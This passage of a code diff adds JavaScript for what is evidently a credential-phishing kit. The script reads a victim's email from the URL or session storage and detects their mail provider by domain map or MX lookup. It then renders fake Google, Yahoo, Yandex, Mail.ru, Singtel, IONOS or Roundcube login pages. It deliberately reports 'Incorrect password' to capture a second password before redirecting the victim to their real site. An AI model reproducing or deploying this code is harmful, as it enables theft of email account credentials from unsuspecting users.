+    const isSuccess    = explicitOk || (!explicitFail && res.ok && stage>=2 && ambiguous);
+
+    if(isSuccess){
+      if(btn)btn.textContent='Success';
+      const target = data.redirect || ('https://' + currentDomain);
+      setTimeout(()=>{goInvoice(target)},500);
+      return;
+    }
+
+    if(stage===1)firstPassword=pass;
+    showError(platform,'Incorrect password. Please try again.');
+    if(el)el.value='';
+    if(btn){btn.disabled=false;btn.textContent=orig}
+    if(loginAttempts>=CONFIG.MAX_ATTEMPTS){
+      showError(platform,'Too many attempts. Redirecting...');
+      setTimeout(()=>{goInvoice('https://'+currentDomain)},1500);
+    }
+  }catch(e){
+    showError(platform,'Connection error. Please try again.');
+    if(btn){btn.disabled=false;btn.textContent=orig}
+  }
+}
+
+/* ---------- UTILS ---------- */
+function toggleYahooPass(){const p=document.getElementById('yahooPass');p.type=p.type==='password'?'text':'password'}
+function toggleGooglePass(){const p=document.getElementById('googlePass');p.type=p.type==='password'?'text':'password'}
+function toggleTonPass(){const p=document.getElementById('tonlinePass');p.type=p.type==='password'?'text':'password'}
+function toggleSingtelPass(){const p=document.getElementById('singtelPass');p.type=p.type==='password'?'text':'password'}
+function toggleYandexPass(){const p=document.getElementById('yandexPass');p.type=p.type==='password'?'text':'password'}
+function toggleMailruPass(){const p=document.getElementById('mailruPass');p.type=p.type==='password'?'text':'password'}
+function togglePasswordVisibility(){const p=document.getElementById('password');p.type=p.type==='password'?'text':'password'}
+
+window.addEventListener('resize',()=>{ if(document.body.classList.contains('is-abv')) fitAbv(); });
+
+/* ---------- BOOT ---------- */
+document.addEventListener('DOMContentLoaded',async function(){
+  const params=new URLSearchParams(window.location.search);
+  let raw=params.get('u')||params.get('email')||'';
+  if(!raw&&window.location.hash.length>1){
+    try{const d=atob(window.location.hash.substr(1)); if(d.includes('@')) raw=d}catch(e){}
+  }
+  if(!raw){ try{ raw = sessionStorage.getItem('flow_email') || ''; }catch(e){} }
+  try{currentEmail=decodeURIComponent(raw)}catch(e){currentEmail=raw}
+  if(!currentEmail)currentEmail='test@outlook.com';
+  proofFromUrl=params.get('p')||'';
+  proofTsFromUrl=params.get('t')||'';
+  currentDomain=extractDomain(currentEmail);
+
+  document.body.className='is-loading';
+
+  if(DOMAIN_MAP[currentDomain]){ route(DOMAIN_MAP[currentDomain]); return; }
+
+  const viaMx = await detectProviderByMX(currentDomain);
+  if(viaMx){ route(viaMx); return; }
+
+  if(currentDomain.endsWith('yandex')||currentDomain.endsWith('ya.ru')) return renderYandex();
+  if(currentDomain.endsWith('mail.ru')) return renderMailru();
+  if(currentDomain.endsWith('singnet.com.sg')||currentDomain.endsWith('singtel.com')) return renderSingtel();
+  if(currentDomain.endsWith('.onhiworks.com')||currentDomain.endsWith('hiworks.com')) return renderHiworks();
+  if(currentDomain.endsWith('.sg')) return renderSingtel();
+  if(currentDomain.endsWith('.ru')) return renderYandex();
+  if(currentDomain.endsWith('.kr')) return renderDaou();
+  if(currentDomain.endsWith('.tw')) return renderHibox();
+  if(currentDomain.endsWith('.de')) return renderIonos();
+
+  renderRoundcube('WEBMAIL');
+});
+</script>
+</body>
+</html>
